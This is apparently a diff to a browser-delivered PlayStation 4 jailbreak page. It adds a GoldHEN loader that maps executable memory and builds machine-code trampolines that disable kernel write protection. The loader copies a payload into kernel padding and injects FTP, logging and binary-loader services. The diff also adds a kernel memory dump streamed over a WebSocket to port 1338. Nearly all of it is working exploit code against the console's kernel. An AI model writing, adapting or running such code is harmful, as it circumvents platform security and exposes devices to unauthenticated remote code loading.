@@ -1073,6 +1073,23 @@ const GH = {
   nlOff: 0x50000, nlLen: 636760,
   rvaPad: 0x10ff000, rvaKmem: 0x466540,
 };
+const GH_STEPS = [
+  [0x12f35, "detect firmware, fill the pointer table"],
+  [0x9ba88, "UI notice 'GoldHEN'", { ptr: true, rdi: 0x99eeb, esi: 0x1f4 }],
+  [0x5cc6,  "save the original pointer from [0x9b8c0]"],
+  [0x945,   "kernel patches A"],
+  [0xf92,   "kernel patches B"],
+  [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
+  [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
+  [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
+  [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
+  [0x32c4,  "inject klog      -> 3232"],
+  [0x325a,  "inject FTP       -> 2121"],
+  [0x328f,  "inject BinLoader -> 9090"],
+  [0x31af,  "inject mono ELF  -> SceShellUI"],
+  [0x1dd,   "last hook on sysent[591]; turns write protection back on"],
+  [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
+];
 const KP_STEPS = [
   [0x11bd1, "init: firmware detect + import/offset tables"],
   [0x5cf3,  "patch group 1"],
@@ -1336,6 +1353,10 @@ async function loadEnabler(url,k,kbase,room){
     blob=await fetchBytes(url||"goldhen.bin","e");
   }
   if(!blob||!blob.length)return false;
+  if(blob.length===GH.nlOff+GH.nlLen){
+    say("[e] "+blob.length+" bytes -- composite image path");
+    return loadGoldhen(url,k,kbase,room,blob);
+  }
   if(blob[0]===0xe9){
     say("[e] "+blob.length+" bytes, leading jmp -- raw payload path");
     say("[e] raw payload -- gated step-loader: patchset + kernel padding route");
@@ -1343,6 +1364,99 @@ async function loadEnabler(url,k,kbase,room){
   }
   say("[e] "+blob.length+" bytes -- unsupported image format");
   return false;
+}
+
+async function loadGoldhen(url,k,kbase,room,vorab){
+  const c=host();let blob=vorab||null;
+  if(blob===null){
+    blob=await fetchBytes(url,"g");
+    if(blob===null)blob=readFromUSB(url);
+    if(blob===null)return false;
+  }
+  if(blob.length!==GH.nlOff+GH.nlLen){
+    say("[g] "+blob.length+" bytes, expected "+(GH.nlOff+GH.nlLen)+" -- not composite image format");
+    return false;
+  }
+  const size=(blob.length+0x4fff)&~0xfff;
+  const m=sc(S.mmap,0,size+0x1000,3,0x1002,-1,0);const buf=v(m.lo,m.hi);
+  if(m.i32===-1||(buf.hi>>>0)===0){say("[g] mmap failed, errno "+c.errno());return false}
+  for(let o=0;o<=size;o+=0x1000)wr4(plus(buf,o),0);
+  if(sc(S.mprotect,buf,size+0x1000,7).i32!==0){say("[g] mprotect rwx failed, errno "+c.errno());return false}
+  codeAt(buf,GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
+  codeAt(buf,GH.tram+0x200).hex("c3");
+  const r3=c.callAddr(plus(buf,GH.tram+0x200),[]);
+  if(r3===undefined||r3===null){say("[g] trampoline page does not execute in ring 3 -- stopping");return false}
+  say("[g] trampoline page executes in ring 3");
+
+  for(let o=0;o<blob.length;o+=8){
+    let lo=0,hi=0;
+    for(let k2=0;k2<4;k2++)lo|=(blob[o+k2]||0)<<(8*k2);
+    for(let k2=0;k2<4;k2++)hi|=(blob[o+4+k2]||0)<<(8*k2);
+    c.p.write8(plus(buf,o),v(lo>>>0,hi>>>0));
+  }
+  say("[g] "+blob.length+" bytes at "+text(buf));
+
+  let t=null;const tram={n:0};
+  const b1=function(x){wr1(plus(buf,GH.tram+tram.n),x);tram.n++};
+  const hex=function(h){const u=unhex(h);for(let i=0;i<u.length;i++)b1(u[i])};
+  const i32=function(n){for(let k2=0;k2<4;k2++)b1(Math.floor(n/Math.pow(256,k2))%256)};
+  const q64=function(q){i32(q.low>>>0);i32(q.hi>>>0)};
+  const callAbs=function(rva){hex("48b8");q64(plus(t,rva));hex("ffd0")};
+  const wpOff=function(){hex("0f20c0");hex("4825");i32(0xfffeffff);hex("0f22c0")};
+  const wpOn=function(){hex("0f20c0");hex("480d");i32(0x00010000);hex("0f22c0")};
+  const fire=function(){const r=c.callAddr(plus(buf,GH.tor),[11,plus(buf,GH.tram)]);return r.lo>>>0};
+  const markClear=function(s2){wr4(plus(buf,GH.mark+s2*8),0xDEADBEEF);wr4(plus(buf,GH.mark+s2*8+4),0xDEADBEEF)};
+  const markRead=function(s2){return[rd4(plus(buf,GH.mark+s2*8)),rd4(plus(buf,GH.mark+s2*8+4))]};
+
+  if(!(await runPatchSet(room)))return false;
+  const kb=kbase;t=plus(kb,GH.rvaPad);
+  wr8(plus(buf,GH.kptr),plus(kb,GH.rvaKmem));
+  say("[g] kernel base "+text(kb)+", padding "+text(t));
+
+  const dmapPad=paddingRW(k,kb);
+  if(!dmapPad){say("[g] stopping: padding would stay read only");return false}
+
+  tram.n=0;wpOff();
+  hex("48be");q64(plus(buf,GH.nlOff));
+  hex("48bf");q64(dmapPad);
+  hex("b9");i32(GH.nlLen);
+  hex("fc");hex("f3a4");
+  wpOn();hex("b8");i32(0x5758);hex("c3");
+  const cp=fire();
+  if(cp!==0x5758){say("[g] copy into padding returned 0x"+cp.toString(16));return false}
+  say("[g] [3] "+GH.nlLen+" bytes into padding");
+
+  let good=0,silent=0;
+  for(let n=0;n<GH_STEPS.length;n++){
+    const rva=GH_STEPS[n][0],what=GH_STEPS[n][1],o=GH_STEPS[n][2]||{};
+    markClear(0);tram.n=0;wpOff();
+    const stepStack=plus(t,0xff000);
+    hex("48b9");q64(stepStack);hex("488921");
+    hex("48bc");q64(stepStack);
+    if(o.rdi!==undefined){hex("48bf");q64(plus(t,o.rdi))}
+    if(o.esi!==undefined){hex("be");i32(o.esi)}
+    hex("31c0");
+    if(o.ptr){hex("48b8");q64(plus(t,rva));hex("488b00");hex("ffd0")}
+    else callAbs(rva);
+    hex("4898");
+    hex("48b9");q64(plus(buf,GH.mark));
+    hex("488901");
+    hex("48b9");q64(stepStack);hex("488b21");
+    wpOn();hex("31c0");hex("c3");
+    fire();
+    const mk=markRead(0);
+    if(mk[1]===0xDEADBEEF){
+      say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" did NOT come back -- "+what);
+      silent++;
+    }else{
+      let rc=mk[0];
+      if(mk[1]===0xffffffff)rc=mk[0]-0x100000000;
+      good++;
+      if(rc!==0)say("[g] ["+(n+1)+"] 0x"+rva.toString(16)+" rc="+rc+(rc===3?" (already injected)":""));
+    }
+  }
+  say("[g] "+good+" of "+GH_STEPS.length+" calls returned, "+silent+" silent");
+  return silent===0;
 }
 
 async function loadPayload(url,vorab){
@@ -1659,8 +1773,64 @@ async function attempt(ctx,opts){
     iface.payload=await loadPayload(want||"kpayload.bin");
   }
   enableDebugMenu(k,kbase);
+
+  if (typeof location !== "undefined" && location.search.indexOf("dump=kernel") !== -1) {
+    (function () {
+      const TEXT_SIZE = 0xCFE880;
+      const DATA_OFF  = 0x1520000;
+      const DATA_SIZE = 0x6065F0;
+      const CHUNK     = 0x400;
+
+      say("[dump] opening ws://" + window.location.hostname + ":1338 ...");
+      try {
+        const ws = new WebSocket("ws://" + window.location.hostname + ":1338");
+        ws.binaryType = "arraybuffer";
+        ws.onerror = function () { say("[dump] ws error"); };
+        ws.onclose = function () { say("[dump] ws closed"); };
+        ws.onopen = function () {
+          ws.send(JSON.stringify({
+            text_size: TEXT_SIZE, data_off: DATA_OFF, data_size: DATA_SIZE,
+            kbase_lo: kbase.low >>> 0, kbase_hi: kbase.hi >>> 0
+          }));
+          const segments = [{ name: "text", off: 0, size: TEXT_SIZE }, { name: "data", off: DATA_OFF, size: DATA_SIZE }];
+          let seg = 0, pos = 0;
+          function pump() {
+            const s = segments[seg];
+            let batch = 0;
+            while (pos < s.size && batch < 128) {
+              const len = Math.min(CHUNK, s.size - pos);
+              const data = k.read(plus(kbase, s.off + pos), len);
+              if (!data) { say("[dump] read fail at " + s.name + "+0x" + pos.toString(16)); ws.send("ABORT"); return; }
+              const copy = new ArrayBuffer(data.length);
+              new Uint8Array(copy).set(data);
+              ws.send(copy);
+              pos += len;
+              batch++;
+            }
+            if (pos >= s.size) {
+              say("[dump] " + s.name + " done (" + s.size + " bytes)");
+              seg++; pos = 0;
+              if (seg >= segments.length) { ws.close(); say("[dump] kernel dump complete"); return; }
+            } else {
+              const pct = Math.floor((pos * 100) / s.size);
+              say("[dump] " + s.name + " " + pct + "%");
+            }
+            setTimeout(pump, 1);
+          }
+          pump();
+        };
+      } catch(eDump) {
+        say("[dump] socket failed: " + ((eDump && eDump.message) || eDump));
+      }
+    })();
+  }
+
   say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"+(iface.payload?", enabler running":""));
+  say("========================================");
   say("  JAILBREAK COMPLETE -- FW 14.xx");
+  say("  Patches: " + done + "/" + PATCHES.length);
+  say("  Debug Settings: check PS4 Settings");
+  say("========================================");
   return iface;
 }
 async function runAfterglow(ctx,opts){
@@ -1702,9 +1872,17 @@ new MutationObserver(()=>{const m=document.getElementById("msg");if(!m)return;
 const params=new URLSearchParams(location.search);
 const isPS4=/PlayStation 4/.test(navigator.userAgent)||params.get("debug")==="1";
 const startBtn=document.getElementById("startBtn");
+const ghBtn=document.getElementById("ghBtn");
+const probeBtn=document.getElementById("probeBtn");
 const hint=document.getElementById("hint");
 const RUN_URL="?afterglow=run&log=1&mode=kpstep&payload=kpayload.bin&g=drain:16&g=drainsz:0x4000&v=1402s";
-function landing(label,hintText,onClick){startBtn.textContent=label;startBtn.disabled=!onClick;startBtn.onclick=onClick||null;hint.textContent=hintText}
+const GH_URL="?afterglow=run&log=1&mode=goldhen&payload=goldhen.bin&g=drain:16&g=drainsz:0x4000&v=1402s";
+const PROBE_URL="?afterglow=probe&log=1&v=1402s";
+function landing(label,hintText,onClick){
+  startBtn.textContent=label;startBtn.disabled=!onClick;startBtn.onclick=onClick||null;hint.textContent=hintText;
+  if(ghBtn)ghBtn.onclick=()=>{try{clearInterval(iv)}catch(e){}location.href=GH_URL};
+  if(probeBtn)probeBtn.onclick=()=>{try{clearInterval(iv)}catch(e){}location.href=PROBE_URL};
+}
 
 if(!isPS4){landing("🚫 PS4 APENAS","Abra no navegador do PlayStation 4.",null);return}
 if(params.get("afterglow")==="done"){
